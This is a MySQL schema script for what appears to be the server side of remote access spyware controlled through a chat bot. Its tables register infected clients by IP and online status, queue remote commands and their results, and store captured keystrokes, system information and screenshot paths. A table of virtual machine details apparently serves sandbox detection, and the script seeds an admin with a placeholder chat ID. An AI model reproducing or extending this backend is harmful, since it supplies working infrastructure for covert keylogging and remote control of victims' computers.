CREATE DATABASE IF NOT EXISTS logger CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

USE logger;

CREATE TABLE IF NOT EXISTS command_logs (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    chat_id VARCHAR(50) NOT NULL,
    user_id VARCHAR(50) NOT NULL,
    command TEXT NOT NULL,
    response TEXT,
    created_at DATETIME NOT NULL,
    INDEX idx_chat_id (chat_id),
    INDEX idx_user_id (user_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS users (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    user_id VARCHAR(50) NOT NULL UNIQUE,
    is_active TINYINT(1) DEFAULT 1,
    is_admin TINYINT(1) DEFAULT 0,
    created_at DATETIME NOT NULL,
    INDEX idx_user_id (user_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS clients (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL UNIQUE,
    ip_address VARCHAR(45),
    is_online TINYINT(1) DEFAULT 0,
    last_seen DATETIME,
    created_at DATETIME NOT NULL,
    INDEX idx_client_id (client_id),
    INDEX idx_ip_address (ip_address)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS client_commands (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id CHAR(32) NOT NULL,
    command TEXT NOT NULL,
    status ENUM('pending', 'completed', 'failed') DEFAULT 'pending',
    created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME,
    completed_at DATETIME,
    result MEDIUMTEXT,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_status (client_id, status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS user_data (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    keystrokes MEDIUMTEXT,
    system_info MEDIUMTEXT,
    screenshot_path VARCHAR(255),
    created_at DATETIME NOT NULL,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE IF NOT EXISTS client_vm_status (
    id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    vm_details TEXT,
    created_at DATETIME NOT NULL,
    FOREIGN KEY (client_id) REFERENCES clients(client_id) ON DELETE CASCADE,
    INDEX idx_client_id (client_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

CREATE TABLE user_selections (
    user_id BIGINT NOT NULL,
    selected_client VARCHAR(255) NOT NULL,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (user_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO users (user_id, is_active, is_admin, created_at)
VALUES ('YOUR_CHAT_ID', 1, 1, NOW())
ON DUPLICATE KEY UPDATE is_admin = 1, is_active = 1;